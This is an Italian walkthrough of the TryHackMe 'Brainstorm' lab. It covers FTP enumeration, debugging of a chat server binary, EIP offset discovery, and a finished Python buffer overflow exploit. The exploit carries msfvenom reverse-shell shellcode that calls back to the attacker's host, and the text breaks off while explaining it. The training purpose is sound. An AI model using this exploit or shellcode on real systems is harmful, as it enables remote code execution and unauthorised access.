
#reverseengineering #assembly 

https://tryhackme.com/room/brainstorm


Distribuisci la macchina ed esegui la scansione della rete per avviare l'enumerazione!

Si prega di notare che questa macchina non risponde al ping (ICMP) e potrebbe impiegare alcuni minuti per avviarsi.


```
nmap -Pn -sS -vv -p- 10.10.201.104
```

Quante porte sono aperte?
```
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
9999/tcp open  abyss         syn-ack ttl 127
```

```
3
```

proviamo a  vedere subito se abbiamo un accesso ftp anonimo

```
ftp anonymous@10.10.201.104
```
alla richiesta di password facciamo invio
```
ls -al
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# ftp anonymous@10.10.201.104
Connected to 10.10.201.104.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -al
229 Entering Extended Passive Mode (|||49320|)
```
mettiamo passiva a off
```
passive off
```

```
ftp> ls -al
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp>
```

```
cd chatserver
```

```
ls -al
```
```
ftp> ls -al
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll

```

troviamo due files che prontamente ci scarichiamo
```
get chatserver.exe
```
```
get essfunc.dll
```
Qual è il nome del file exe che hai trovato?
```
chatserver.exe
```


```
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************| 43747      112.98 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
43747 bytes received in 00:00 (112.94 KiB/s)
ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************| 30761      143.06 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 32 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
30761 bytes received in 00:00 (142.78 KiB/s)

```
abbiamo ricevuto un avvertimento WARNING! 45 bare linefeeds received in ASCII mode, per sicurezza riscarichiamo i file digitando prima il comando
```
binary
```

```
get chatserver.exe
```

```
get essfunc.dll
```

```
exit
```
usciamo e continuiamo ad analizzare le porte trovate aperte

Saltiamo momentaneamente la porta 3389 che solitamente è adibita al servizio RDP

ed esaminiamo la porta 9999 che ospita un servizio sconosciuto
```
10.10.201.104:9999
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# wget http:\\10.10.201.104:9999                                                         
http:\10.10.201.104:9999: Unsupported scheme.
```
proviamo ad ottenere un banner
```
nc 10.10.201.104 9999
```

otteniamo

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc 10.10.201.104 9999             
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): dam
Write a message: Hello     


Fri Sep 26 02:53:18 2025
dam said: Hello


Write a message: 
```

Dopo l'enumerazione, dovresti aver notato che il servizio che interagisce sulla porta sconosciuta è in qualche modo correlato ai file che hai trovato! C'è un modo per sfruttare questo strano servizio per accedere al sistema? 

Vale la pena usare uno script Python per provare diversi payload e ottenere l'accesso! È anche possibile utilizzare i file per testare l'exploit localmente. 

Se non hai mai eseguito buffer overflow prima, dai un'occhiata [a questa](https://tryhackme.com/room/bof1) stanza!

```
python -c 'print("A" * 2500)'
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
dopo aver immesso più di 20 caratteri nell'username accorgendomi che questo veniva accorciato ho provato ad immettere sempre piu caratteri nell'input Write a message 
fino a quando l'applicazione si è bloccata

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc 10.10.201.104 9999
(UNKNOWN) [10.10.201.104] 9999 (?) : Connection timed out
                                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc 10.10.201.104 9999
```
credo che per colpa del tentativo di buffer overflows eseguito direttamente mi è toccato riavviare il laboratorio!

Quindi meglio lavorare sui file scaricati che sicuramente saranno una copia di quelli eseguiti sul server

**Trasferiamo i due file scaricati su Windows in quanto lavoreremo con Immunity Debugger**
trasferiamo i file utilizzando su kali 
```
python3 -m http.server 8080
```
e da Windows li scarichiamo dal browser

Ora avviamo:
- chatserver.exe
- Immunity Debugger

dal menu File scegli "Allega", quindi seleziona il processo del chatserver
Nota che nell'angolo in basso a destra c'è scritto "Paused". Devi premere F9 per eseguirlo

Ora apriamo un terminale su Windows per conoscere il nostro ip
```
ipconfig
```
il mio è
```
192.168.1.103
```

ora torniamo su kali e ci colleghiamo al nostro chatserver locale in windows

```
nc 192.168.1.103 9999
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc 192.168.1.103 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 
```

ora apriamo un'altro terminale in kali e visto che precedentemente abbiamo mandato in blocco tutto con 2500 caratteri

per individuare l'offset preciso in cui il `EIP`puntatore all'istruzione estesa è stato sovrascritto,

creeremo un pattern univoco utilizzando il `Metasploit`modulo `pattern_create.rb`

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

ora immettiamo questo testo alla richiesta della chat di Immettere il Messaggio

- su **Immunity Debugger** abbiamo ottenuto un **Access violation** e il valore **EIP è 31704330**

ora utilizziamo lo script di offset del modello msf per trovare la lunghezza del carattere di cui abbiamo bisogno (la lunghezza esatta che manda in crash l'applicazione):

```
msf-pattern_offset -l 2500 -q 31704330
```

```
┌──(kali㉿kali)-[~]
└─$ msf-pattern_offset -l 2500 -q 31704330
[*] Exact match at offset 2012
```

Ora dobbiamo costruire il nostro script Python che useremo per sfruttare il buffer overflows
 
 Come base di partenza possiamo utilizzare questo https://github.com/gh0x0st/Buffer_Overflow
```
nano bof.py
```
```
#!/usr/bin/env python3

import socket
import sys

address = '192.168.1.103'
port = 9999
user = 'dam'
message = 'A' * 2012

try:
    print('[+] Sending buffer')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    # If server sends banner(s)
    try:
        s.recv(1024)
        s.recv(1024)
    except Exception:
        pass
    # send expects bytes in Python 3
    s.send((user + '\r\n').encode('utf-8'))
    try:
        s.recv(1024)
    except Exception:
        pass
    s.send((message + '\r\n').encode('utf-8'))
except Exception as e:
    print('[!] Unable to connect to the application:', e)
    sys.exit(0)
finally:
    try:
        s.close()
    except Exception:
        pass

```
ora rilanciamo il serverchat.exe ed eseguiamo 
```
python3 bof.py
```

Perfetto l'app va in crash e lo script è funzionante

Ora bisogna sovrascrivere EIP per poter eseguire lo shellcode malevolo, per poterlo verificare
aggiungiamo al nostro script la seguente riga dopo `message = 'A' * 2012`
```
message += 'B' * 4
```
rieseguiamo il tutto controllando su **Immunity Debugger** se abbiamo sovrascritto EIP

```
EAX 0110E6CC ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ECX 00F04744
EDX 00000A0D
EBX 0000B086
ESP 0110EEAC ASCII "
"
EBP 41414141
ESI 0040199E chatserv.0040199E
EDI 0040199E chatserv.0040199E
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 1  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 384000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

```

perfetto EIP 42424242 è stato sovrascritto con le nostre BBBB

Ora  bisogna controllare la presenza di caratteri non validi, poiché l'invio di qualsiasi carattere causerebbe l'interruzione dell'overflow prima che venga completata l'esecuzione del payload.

Ci servirà per quando utilizzeremo MSFVenom nella generarazione del nostro shellcode, in modo da escludere qualsiasi carattere che ne impedirebbe l'esecuzione.

#cattivicaratteri
Su questo sito https://github.com/cytopia/badchars
 Abbiamo un generatore di caratteri esadecimali errati per istruire i codificatori come **shikata-ga-nai** a trasformarli in altri caratteri.

Quidi ora sotto la riga `message += 'B' * 4`
aggiungiamo
```
message += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
```
rieseguiamo il tutto controllando su **Immunity Debugger** se abbiamo le nostre A (41), poi le B (42) e infine i nostri caratteri errati al contrario

```
0102EE9C   41414141  䅁䅁
0102EEA0   41414141  䅁䅁
0102EEA4   41414141  䅁䅁
0102EEA8   42424242  䉂䉂
0102EEAC   04030201  ȁЃ
0102EEB0   08070605  ؅ࠇ
0102EEB4   0C0B0A09  ਉఋ
0102EEB8   100F0E0D  ญဏ
0102EEBC   14131211  ሑᐓ
0102EEC0   18171615  ᘕ᠗
```

non ci sono caratteri errati possiamo proseguire , In quanto `\x00` l'ho **già escluso** perchè ho effettuato delle prove in precedenza

**Ora dobbiamo trovare ESP** che ci serve per puntare al nostro payload

Possiamo utilizzare  [mona](https://github.com/corelan/mona) , che ha un comando per trovarla 

Mona.py è uno script Python che può essere utilizzato per automatizzare e velocizzare ricerche specifiche durante lo sviluppo di exploit (tipicamente per la piattaforma Windows). Funziona su Immunity Debugger e WinDBG

se non lo abbiamo già installato
1. trascinare mona.py nella cartella 'PyCommands' (all'interno della cartella dell'applicazione Immunity Debugger).
2. Installare Python 2.7.14 (o una versione successiva, la 2.7.xx) in c:\python27, sovrascrivendo così la versione inclusa con Immunity. Questo è necessario per evitare problemi con TLS quando si tenta di aggiornare Mona. Assicurarsi di installare la versione a 32 bit di Python.

ora eseguiamo il comando digitandolo in basso sul input dei comandi di Immunity Debugger

```
!mona modules
```
che ci da come risultato
```
Log data, item 14
 Address=0BADF00D
 Message= 0x006e0000 | 0x006eb000 | 0x0000b000 | True   | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\demo\Desktop\Test2\essfunc.dll) 0x0
```
Poiché essfunc.dll non è protetto da ASLR, questo è il nostro risultato migliore.

il prossimo comando ci fornisce i punti di salto trovati e i loro indirizzi,
```
!mona jmp -r esp -cpb "\x00
```

```
!mona jmp -r esp
```
uno dei quali è 
```
0x625014eb
```

Che dobbiamo trasformare in **Little Endian** che è il metodo in cui il valore è disposto dal byte meno significativo al byte più significativo:
quindi riscriviamo dal meno  byte significativo `xeb` `x14` `x50` `x62`
```
esp = '\xeb\x14\x50\x62'
```

**Ora creiamo il nostro payload**

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.99.134 LPORT=1234 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00"
```

`-b "\x00"`  è il cattivo carattere da escludere 
ecco il risultato di msfvenom
```
buf =  b""
buf += b"\xbb\xfb\x11\x15\x78\xd9\xcf\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x13"
buf += b"\xed\xf7\x8d\x1f\xe6\x7a\x6d\xdf\xf7\x1a\xe7\x3a"
buf += b"\xc6\x1a\x93\x4f\x79\xab\xd7\x1d\x76\x40\xb5\xb5"
buf += b"\x0d\x24\x12\xba\xa6\x83\x44\xf5\x37\xbf\xb5\x94"
buf += b"\xbb\xc2\xe9\x76\x85\x0c\xfc\x77\xc2\x71\x0d\x25"
buf += b"\x9b\xfe\xa0\xd9\xa8\x4b\x79\x52\xe2\x5a\xf9\x87"
buf += b"\xb3\x5d\x28\x16\xcf\x07\xea\x99\x1c\x3c\xa3\x81"
buf += b"\x41\x79\x7d\x3a\xb1\xf5\x7c\xea\x8b\xf6\xd3\xd3"
buf += b"\x23\x05\x2d\x14\x83\xf6\x58\x6c\xf7\x8b\x5a\xab"
buf += b"\x85\x57\xee\x2f\x2d\x13\x48\x8b\xcf\xf0\x0f\x58"
buf += b"\xc3\xbd\x44\x06\xc0\x40\x88\x3d\xfc\xc9\x2f\x91"
buf += b"\x74\x89\x0b\x35\xdc\x49\x35\x6c\xb8\x3c\x4a\x6e"
buf += b"\x63\xe0\xee\xe5\x8e\xf5\x82\xa4\xc6\x3a\xaf\x56"
buf += b"\x17\x55\xb8\x25\x25\xfa\x12\xa1\x05\x73\xbd\x36"
buf += b"\x69\xae\x79\xa8\x94\x51\x7a\xe1\x52\x05\x2a\x99"
buf += b"\x73\x26\xa1\x59\x7b\xf3\x66\x09\xd3\xac\xc6\xf9"
buf += b"\x93\x1c\xaf\x13\x1c\x42\xcf\x1c\xf6\xeb\x7a\xe7"
buf += b"\x91\x19\x75\x84\xe7\x76\x8b\x4a\xec\x54\x02\xac"
buf += b"\x86\x48\x43\x67\x3f\xf0\xce\xf3\xde\xfd\xc4\x7e"
buf += b"\xe0\x76\xeb\x7f\xaf\x7e\x86\x93\x58\x8f\xdd\xc9"
buf += b"\xcf\x90\xcb\x65\x93\x03\x90\x75\xda\x3f\x0f\x22"
buf += b"\x8b\x8e\x46\xa6\x21\xa8\xf0\xd4\xbb\x2c\x3a\x5c"
buf += b"\x60\x8d\xc5\x5d\xe5\xa9\xe1\x4d\x33\x31\xae\x39"
buf += b"\xeb\x64\x78\x97\x4d\xdf\xca\x41\x04\x8c\x84\x05"
buf += b"\xd1\xfe\x16\x53\xde\x2a\xe1\xbb\x6f\x83\xb4\xc4"
buf += b"\x40\x43\x31\xbd\xbc\xf3\xbe\x14\x05\x13\x5d\xbc"
buf += b"\x70\xbc\xf8\x55\x39\xa1\xfa\x80\x7e\xdc\x78\x20"
buf += b"\xff\x1b\x60\x41\xfa\x60\x26\xba\x76\xf8\xc3\xbc"
buf += b"\x25\xf9\xc1"
```

ora completiamo il nostro script rivisto in quanto il precedente mi dava problemi
```
nano bof.py
```
```
import socket, sys

ip = '10.10.179.93'
port = 9999
timeout = 5

buffer = 'A' * 2012
buffer += '\xeb\x14\x50\x62'

buffer += '\x90' * 16

shellcode =  b""
shellcode += b"\xbb\xfb\x11\x15\x78\xd9\xcf\xd9\x74\x24\xf4\x58"
shellcode += b"\x31\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x13"
shellcode += b"\xed\xf7\x8d\x1f\xe6\x7a\x6d\xdf\xf7\x1a\xe7\x3a"
shellcode += b"\xc6\x1a\x93\x4f\x79\xab\xd7\x1d\x76\x40\xb5\xb5"
shellcode += b"\x0d\x24\x12\xba\xa6\x83\x44\xf5\x37\xbf\xb5\x94"
shellcode += b"\xbb\xc2\xe9\x76\x85\x0c\xfc\x77\xc2\x71\x0d\x25"
shellcode += b"\x9b\xfe\xa0\xd9\xa8\x4b\x79\x52\xe2\x5a\xf9\x87"
shellcode += b"\xb3\x5d\x28\x16\xcf\x07\xea\x99\x1c\x3c\xa3\x81"
shellcode += b"\x41\x79\x7d\x3a\xb1\xf5\x7c\xea\x8b\xf6\xd3\xd3"
shellcode += b"\x23\x05\x2d\x14\x83\xf6\x58\x6c\xf7\x8b\x5a\xab"
shellcode += b"\x85\x57\xee\x2f\x2d\x13\x48\x8b\xcf\xf0\x0f\x58"
shellcode += b"\xc3\xbd\x44\x06\xc0\x40\x88\x3d\xfc\xc9\x2f\x91"
shellcode += b"\x74\x89\x0b\x35\xdc\x49\x35\x6c\xb8\x3c\x4a\x6e"
shellcode += b"\x63\xe0\xee\xe5\x8e\xf5\x82\xa4\xc6\x3a\xaf\x56"
shellcode += b"\x17\x55\xb8\x25\x25\xfa\x12\xa1\x05\x73\xbd\x36"
shellcode += b"\x69\xae\x79\xa8\x94\x51\x7a\xe1\x52\x05\x2a\x99"
shellcode += b"\x73\x26\xa1\x59\x7b\xf3\x66\x09\xd3\xac\xc6\xf9"
shellcode += b"\x93\x1c\xaf\x13\x1c\x42\xcf\x1c\xf6\xeb\x7a\xe7"
shellcode += b"\x91\x19\x75\x84\xe7\x76\x8b\x4a\xec\x54\x02\xac"
shellcode += b"\x86\x48\x43\x67\x3f\xf0\xce\xf3\xde\xfd\xc4\x7e"
shellcode += b"\xe0\x76\xeb\x7f\xaf\x7e\x86\x93\x58\x8f\xdd\xc9"
shellcode += b"\xcf\x90\xcb\x65\x93\x03\x90\x75\xda\x3f\x0f\x22"
shellcode += b"\x8b\x8e\x46\xa6\x21\xa8\xf0\xd4\xbb\x2c\x3a\x5c"
shellcode += b"\x60\x8d\xc5\x5d\xe5\xa9\xe1\x4d\x33\x31\xae\x39"
shellcode += b"\xeb\x64\x78\x97\x4d\xdf\xca\x41\x04\x8c\x84\x05"
shellcode += b"\xd1\xfe\x16\x53\xde\x2a\xe1\xbb\x6f\x83\xb4\xc4"
shellcode += b"\x40\x43\x31\xbd\xbc\xf3\xbe\x14\x05\x13\x5d\xbc"
shellcode += b"\x70\xbc\xf8\x55\x39\xa1\xfa\x80\x7e\xdc\x78\x20"
shellcode += b"\xff\x1b\x60\x41\xfa\x60\x26\xba\x76\xf8\xc3\xbc"
shellcode += b"\x25\xf9\xc1"


string = bytes(buffer, 'latin-1')
string += shellcode

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(timeout)
		s.connect((ip, port))
		s.recv(1024)
		s.send(bytes('nop\r\n', 'latin-1'))
		s.recv(1024)
		s.send(string)
		s.recv(1024)
except Exception as e:
	print(e)
finally:
	s.close()
```

```
'A' * 2012
```
	il numero di A necessario per mandare in crash l'applicazione

```
buffer += '\xeb\x14\x50\x62'
```
	Il valore dell'ESP che istruirà l'applicazione a eseguire il nostro codice

```
buffer += '\x90' * 16
```
	Il nostro codice potrebbe essere interrotto, l'aggiunta di una slitta NOP ne garantisce il funzionamento

```
shellcode =  b""
shellcode += b"\xbb\xfb\x11\x15\x78\xd9\xcf\xd9\x74\x24\xf4\x58"
